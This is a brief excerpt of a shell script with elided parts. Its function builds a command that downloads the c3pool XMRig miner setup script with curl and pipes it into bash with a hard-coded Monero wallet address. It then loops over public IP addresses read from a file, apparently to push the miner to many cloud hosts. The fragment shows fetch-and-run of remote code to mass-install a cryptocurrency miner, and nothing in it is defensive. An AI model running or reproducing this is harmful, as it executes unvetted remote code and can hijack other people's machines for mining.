...
function wa_bi() {
  ...
  text2=\""curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 4A52prEmiaUQNhj6EsBxhYFGf9yDayMscBaPv4enNvNFAKuSBhqqqSxBNYSS8GLbjTdFiHL4aCp9bdfEKjSr8qs7F7pqrzG\""
  jq -c '.data[].publicip' /root/oracle/ip/iplist |  tr -d '"' | while read i; do
  test="${text1}$i ${text2}"
